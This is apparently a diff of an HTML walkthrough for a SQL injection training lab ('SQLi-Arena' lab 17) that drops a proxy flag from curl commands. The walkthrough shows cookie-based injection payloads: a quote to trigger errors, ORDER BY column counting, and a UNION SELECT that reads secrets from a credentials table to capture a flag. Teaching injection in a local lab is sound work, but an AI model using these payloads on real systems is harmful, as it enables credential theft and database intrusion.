@@ -12,7 +12,7 @@
         <span class="terminal-title">Step 1. Normal Cookie</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id=user1" "http://localhost/SQLi-Arena/mysql/lab17"<br><br>
+        <span class="prompt">$ </span>curl -b "user_id=user1" "http://localhost/SQLi-Arena/mysql/lab17"<br><br>
         <span class="prompt">Cookie: </span>user_id=user1<br><br>
         <span class="prompt">Query: </span>SELECT theme, language, last_login FROM preferences WHERE user_id = 'user1'<br><br>
         <span class="prompt">Result: </span>Theme: dark | Language: en | Last Login: 2026-03-20 08:30:00
@@ -33,7 +33,7 @@
         <span class="terminal-title">Step 2. Trigger SQL Error</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id='" "http://localhost/SQLi-Arena/mysql/lab17"<br><br>
+        <span class="prompt">$ </span>curl -b "user_id='" "http://localhost/SQLi-Arena/mysql/lab17"<br><br>
         <span class="prompt">Cookie: </span>user_id='<br><br>
         <span class="prompt">Query: </span>SELECT theme, language, last_login FROM preferences WHERE user_id = '''<br><br>
         <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1<br><br>
@@ -54,7 +54,7 @@
         <span class="terminal-title">Step 3. Column Count</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id=' ORDER BY 1 -- -" "http://localhost/SQLi-Arena/mysql/lab17"<br>
+        <span class="prompt">$ </span>curl -b "user_id=' ORDER BY 1 -- -" "http://localhost/SQLi-Arena/mysql/lab17"<br>
         <span class="prompt">Cookie: </span>user_id=' ORDER BY 1 -- -&nbsp;&nbsp; &rarr; No error<br>
         <span class="prompt">Cookie: </span>user_id=' ORDER BY 2 -- -&nbsp;&nbsp; &rarr; No error<br>
         <span class="prompt">Cookie: </span>user_id=' ORDER BY 3 -- -&nbsp;&nbsp; &rarr; No error<br>
@@ -101,7 +101,7 @@
         <span class="terminal-title">Step 5: curl Method</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 -b "user_id=' UNION SELECT secret,service,NOW() FROM credentials WHERE service='database' -- -" \<br>
+        <span class="prompt">$ </span>curl -b "user_id=' UNION SELECT secret,service,NOW() FROM credentials WHERE service='database' -- -" \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab17"<br><br>
         <span class="prompt">Result: </span>Theme: <strong>FLAG{c00k13_h34d3r_1nj3ct10n}</strong> | Language: database | Last Login: 2026-03-24 03:38:18
     </div>
@@ -142,7 +142,7 @@
         <span class="terminal-title">Step 7. Python Automation (lab17_header_cookie.py)</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>python3 scripts/lab17_header_cookie.py http://localhost/SQLi-Arena/<br><br>
+        <span class="prompt">$ </span>python3 scripts/lab17_header_cookie.py http://localhost/SQLi-Arena<br><br>
         <span class="prompt">[*] </span>Injection point: Cookie header (user_id)<br>
         <span class="prompt">[*] </span>Step 1: Confirming cookie injection point...<br>
         <span class="prompt">[+] </span>ORDER BY 4 failed &rarr; query has 3 columns<br>
